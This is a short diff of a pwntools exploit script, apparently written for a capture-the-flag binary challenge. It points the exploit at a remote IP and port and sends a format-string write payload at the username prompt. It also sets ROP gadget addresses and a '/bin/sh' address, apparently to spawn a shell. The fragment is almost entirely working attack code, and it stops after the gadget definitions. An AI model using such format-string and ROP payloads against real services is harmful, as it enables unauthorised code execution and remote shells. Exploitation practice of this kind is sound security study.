@@ -1,10 +1,10 @@
 from pwn import*
 context.log_level ='DEBUG'
 p= process('./main')
-#p = remote('183.129.189.60',10001)
-p.sendafter('username:','%24$pUU' + '\x20')
-gdb.attach(p,"b *0x401512")
-p.sendline(str(1))
+p = remote('183.129.189.60',10001)
+p.sendlineafter('username:','%*18$d%5$n')
+#gdb.attach(p,"b *0x401512")
+p.sendline('1')
 pop_rdi_ret = 0x401733
 pop_rsi_r15 = 0x401731
 binsh  =0x404090
